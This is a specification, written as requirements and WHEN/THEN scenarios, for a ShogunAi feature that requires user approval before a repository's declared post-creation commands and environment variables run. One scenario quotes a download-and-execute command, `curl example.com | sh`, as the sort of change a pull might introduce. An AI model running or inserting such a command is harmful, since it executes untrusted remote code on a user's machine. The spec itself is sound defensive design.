# repository-trust Specification

## Purpose
Makes sure the commands a repository's `.shogunai.json` asks ShogunAi to run only run after the user on this machine has seen and approved them, and again whenever they change.

## Requirements

### Requirement: Approve a repository's post-creation commands
The system SHALL keep, per machine and per repository, one approval of what the repository's `.shogunai.json` asks ShogunAi to run or apply: its post-creation commands, the variables it declares in `env` with their templates, and its `envFile`. An approval SHALL cover exactly what it was given: a different list of commands or the same commands in another order, a variable added, removed, renamed or with another template, or another `envFile`, SHALL count as not approved. A repository that declares no `env` and no `envFile` SHALL keep the approval it had of its commands. Approvals SHALL be stored under the user's ShogunAi folder, readable and writable only by the user.

#### Scenario: Approved commands
- **WHEN** the user approved `[["npm", "install"]]` for `~/projects/main-repo` and `.shogunai.json` still declares it
- **THEN** the commands count as approved for every worktree of that repository

#### Scenario: Commands changed by a pull
- **WHEN** after the approval a pull changes the commands to `[["npm", "install"], ["sh", "-c", "curl example.com | sh"]]`
- **THEN** the commands count as not approved until the user approves the new list

#### Scenario: Another repository
- **WHEN** another repository declares the same commands
- **THEN** they count as not approved for it

#### Scenario: Variables changed by a pull
- **WHEN** the user approved a repository declaring `{ "env": { "PORT": "${port}" } }` and a pull adds `"API_URL": "https://example.com"`
- **THEN** the repository counts as not approved until the user approves its current commands and variables

#### Scenario: Environment file changed
- **WHEN** after the approval `envFile` changes from `.env.shogunai` to `.env.local`
- **THEN** the repository counts as not approved

#### Scenario: Only variables declared
- **WHEN** the repository declares `env` and no post-creation commands
- **THEN** its variables need an approval like commands do

#### Scenario: Approval from an earlier version
- **WHEN** the user approved a repository's commands with an earlier version and the repository declares no `env` nor `envFile`
- **THEN** the commands still count as approved

### Requirement: Ask before running unapproved commands in the desktop app
When a creation or provisioning started from the desktop app reaches a repository that isn't approved, the app SHALL ask before preparing the worktree's environment, showing every post-creation command in full and every declared variable with its template, plus the environment file, and let the user approve them, which runs the commands and applies the variables, or skip them for this worktree. Skipping SHALL keep the worktree, without the declared variables, the environment file or the commands, and report it.

#### Scenario: Run and approve
- **WHEN** the user creates a worktree in a repository with unapproved commands and chooses to run them
- **THEN** the commands run, they are approved, and the next creation doesn't ask

#### Scenario: Skip
- **WHEN** the user chooses to skip them
- **THEN** the worktree is created with its files, the commands don't run, and the app says so

#### Scenario: Variables shown before approving
- **WHEN** the repository declares `{ "env": { "PORT": "${port}" }, "envFile": ".env.shogunai" }` and isn't approved
- **THEN** the dialog shows `PORT` with `${port}` and the environment file `.env.shogunai` before anything is applied

#### Scenario: Skip declared variables
- **WHEN** the user skips a repository that declares `PORT` and `envFile`
- **THEN** the worktree has no reserved port for `PORT`, no environment file is written, and the app says the repository's configuration wasn't approved

### Requirement: Ask before running unapproved commands in the command line
`shogun new` and `shogun provision` SHALL, when the repository isn't approved and standard input is a terminal, print its post-creation commands, its declared variables with their templates and its environment file before preparing the environment, and ask for confirmation, approving them and applying them only on an explicit yes. When they can't ask, and always in `shogun hook herdr` and `shogun hook worktree-create`, they SHALL skip them, print a note on standard error that names `shogun trust`, and otherwise succeed.

#### Scenario: Interactive yes
- **WHEN** the user runs `shogun new TASK-123` on a terminal and answers yes
- **THEN** the commands run and are approved

#### Scenario: Interactive no
- **WHEN** the user answers no or just presses Enter
- **THEN** the worktree is created, the commands don't run, and the command exits with code 0

#### Scenario: Herdr creates a worktree
- **WHEN** Herdr's `worktree.created` event provisions a worktree of a repository with unapproved commands
- **THEN** files are provisioned, the commands don't run, a note naming `shogun trust` goes to standard error, and the command exits with code 0

#### Scenario: Unapproved variables on a terminal
- **WHEN** the user runs `shogun new TASK-123` on a terminal in a repository declaring `PORT` that isn't approved
- **THEN** `PORT` and its template are printed before the question, and answering no creates the worktree without reserving a port for `PORT`

#### Scenario: Unapproved variables without a terminal
- **WHEN** `shogun hook worktree-create` provisions a worktree of a repository whose declared variables aren't approved
- **THEN** the worktree gets no declared variables nor environment file, and the note on standard error names `shogun trust`

### Requirement: Review and approve from the command line
`shogun trust [path]` SHALL print the repository's post-creation commands, its declared variables with their templates, its environment file and whether they are approved, and ask to approve them when standard input is a terminal. `shogun trust --yes` SHALL approve them without asking, and `shogun trust --revoke` SHALL remove the repository's approval. With `--json` the object SHALL also list the variables with their name and template, and the environment file.

#### Scenario: Approve from a script
- **WHEN** the user runs `shogun trust --yes` in `~/projects/main-repo`
- **THEN** the current commands and variables are approved and later hooks run and deliver them

#### Scenario: Revoke
- **WHEN** the user runs `shogun trust --revoke`
- **THEN** the next creation asks again, or skips the commands and variables where it can't ask

#### Scenario: Nothing to approve
- **WHEN** the repository declares no post-creation commands, no `env` and no `envFile`
- **THEN** the command says so and exits with code 0

#### Scenario: Variables to review
- **WHEN** the repository declares `{ "env": { "PORT": "${port}" } }` and no commands, and the user runs `shogun trust`
- **THEN** it prints `PORT` with `${port}`, says it isn't approved and asks to approve it

#### Scenario: Variables as JSON
- **WHEN** the user runs `shogun trust --json` in that repository
- **THEN** the object lists `PORT` with its template `${port}`, `envFile` as `null` and `approved: false`

### Requirement: Commands written from the desktop app are approved
When the user saves environment variables or the environment file from the desktop app's project settings, what the repository then declares SHALL be approved for that repository, provided it was approved before the save or declares no post-creation commands, so a save never approves commands the user didn't approve. Project settings SHALL show the repository's current commands and variables, whether they are approved, and let the user approve or revoke the approval.

#### Scenario: Edited in settings
- **WHEN** the repository's commands `[["npm", "install"]]` are approved and the user adds a variable in project settings and saves
- **THEN** the next creation runs the commands and delivers the variable without asking

#### Scenario: Save with unapproved commands
- **WHEN** a pull added unapproved post-creation commands and the user changes a variable in project settings and saves
- **THEN** the repository stays not approved and project settings says so

#### Scenario: Changed outside the app
- **WHEN** `.shogunai.json` changes its commands or variables on disk after the save
- **THEN** project settings shows them as not approved

#### Scenario: Variable added in settings
- **WHEN** the user adds `PORT` with `${port}` in project settings and saves
- **THEN** the next session started in a worktree of that repository receives `PORT`

#### Scenario: Approve from settings
- **WHEN** project settings shows a repository whose declared variables aren't approved and the user approves them
- **THEN** the variables are delivered from then on
